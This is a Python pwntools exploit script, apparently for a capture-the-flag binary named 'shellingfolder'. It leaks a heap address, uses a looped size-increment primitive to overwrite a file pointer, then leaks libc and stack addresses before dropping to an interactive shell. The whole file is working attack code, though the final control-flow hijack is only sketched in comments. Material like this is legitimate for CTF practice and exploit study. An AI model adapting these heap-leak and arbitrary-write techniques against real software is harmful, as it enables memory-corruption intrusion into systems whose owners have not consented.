#!/usr/bin/python2
from pwn import *
import binascii
import time
import struct

def io(chall, tosend) :
    print chall.recv()
    chall.sendline(tosend)

def io_silent(chall, tosend) :
    chall.recv()
    chall.sendline(tosend)

def heap_leak(chall):
    #trigger memory leak
    io_silent(chall,"3")
    io_silent(chall,"A"*24)
    io_silent(chall,"4")
    io_silent(chall,"foo")
    io_silent(chall,"32")
    io_silent(chall,"6")
    
    foo = chall.recv()
    #print foo
    heap_leak =  foo.split(":")[0].split("A")[-1][0:6]

    #cleanup
    chall.sendline("5")
    io_silent(chall,"A"*24)

    io_silent(chall,"5")
    io_silent(chall,"foo")
    
    chall.recv()
    return heap_leak

#writes addr+offset to addr
def write_to_addr(char, chall, addr, offset):
   
    chall.sendline("4")

    #print binascii.hexlify(addr[0:6])
    #print binascii.hexlify(addr)
    io(chall,char*24 + addr[0:6])
    io(chall,str(0x7FFFFFFF))
    
    #chall.interactive()
    #chall.interactive()
    addr_int = struct.unpack("<Q",addr)[0] + offset
    itr = addr_int / 0x7FFFFFFF
    rem = addr_int % 0x7FFFFFFF
    #rem -= 32
    print "adding",hex(itr * 0x7fffffff + rem),"to", hex(addr_int)

    print "itr = ",itr
    print "rem = ",rem

    #print str(addr_int),":",str(0x7fffffff),"*",str(itr),"+",str(rem),"+",str(offset)
    i = 0
    
    chall.recv()
    #chall.interactive()
    while i < itr:
        chall.sendline("6")
        if  i % 10000 == 1:
            print i
        time.sleep(0.00001)
        chall.recv()
        i +=1

    print "i =",i
    #chall.interactive()    
    
    chall.sendline("5")
    io_silent(chall, char*24 + addr[0:6])

    io_silent(chall,"4")
    io_silent(chall, char*24 + addr[0:6])
    io_silent(chall,str(rem))
    io_silent(chall,"6")
    print "done with writing"
    return (itr * 0x7fffffff + rem)
   # chall.interactive()


def place_ptr(chall):
    #create foo folder
    chall.sendline("3")
    io_silent(chall,"foo")
    #move to foo folder
    io_silent(chall,"2")
    io_silent(chall,"foo")
    #create files
    for i in xrange(0,8):
        io_silent(chall,"4")
        io_silent(chall,"a")
        io_silent(chall,"1")
    #delete files
    #chall.interactive()
    for i in xrange(0,8):
        io_silent(chall,"5")
        io_silent(chall,"a")
    #back to root dir
    io_silent(chall, "2")
    io_silent(chall, "..")
    
chall = process("./shellingfolder")
print "Starting!"
heap_addr = heap_leak(chall)
print "Heap address:", binascii.hexlify(heap_addr[::-1])

#file addr at 0x555eaaf13010
#leak addr at 0x555eaaf13088
#libc addr at 0x555eaaf131c0

#need to overwrite a file pointer with libc_ptr_addr-0x58
#chall.interactive()
#place_ptr(chall)

#chall.interactive()
target_addr = struct.unpack("<Q",heap_addr+"\x00\x00")[0] + 176
target_addr = struct.pack("<Q",target_addr)

offset = 56

#print "Writing" ,hex(struct.unpack("<Q",target_addr)[0] - offset), "to", hex(struct.unpack("<Q",target_addr)[0])

chall.sendline("4")
io_silent(chall,"a")
io_silent(chall,"1")
chall.recv()

place_ptr(chall)

io(chall,"5")
io(chall,"a")
chall.recv()
#chall.interactive()
print "WRITING!"
#chall.interactive()
current_val = write_to_addr("A",chall,target_addr,offset)

io_silent(chall,"2")
io_silent(chall,"foo")
chall.recv()

chall.sendline("1")
libc_leak = chall.recv().split("-"*22)[1].split("\n")[1]

print "Libc Leak!:", binascii.hexlify(libc_leak[::-1])

chall.sendline("2")
chall.recv()
chall.sendline("..")
chall.recv()
#bail on old, corrupt directory
chall.sendline("3")
chall.recv()
chall.sendline("bar")
chall.recv()

chall.sendline("2")
chall.recv()
chall.sendline("bar")
chall.recv()

#chall.interactive()

print "end result:", struct.unpack("<Q",libc_leak+"\x00\x00")[0] + 2136 - 0x58
offset = struct.unpack("<Q",libc_leak+"\x00\x00")[0] - struct.unpack("<Q",target_addr)[0] - current_val + 2136 - 0x58

write_to_addr("B",chall,target_addr,offset)

io_silent(chall,"2")
io_silent(chall,"..")

io_silent(chall,"2")
io_silent(chall,"foo")

chall.recv()
chall.sendline("1")

stack_leak = chall.recv().split("-"*22)[1].split("\n")[1]
stack_leak = stack_leak[5:11]

print "Stack leak!:",binascii.hexlify(stack_leak[::-1])
stack_start = struct.pack("<Q",struct.unpack("<Q",stack_leak+"\x00\x00")[0] - 132012)

print "Stack Start:",binascii.hexlify(stack_start[::-1])
#sample stack leak - 0x7ffedbc513aci
#sample location of ret addr for maib fn - 0x7ffedbc50cd8
#difference: 0x6f4

#place_ptr(chall)
#time.sleep(20)
chall.interactive()
chall.close()
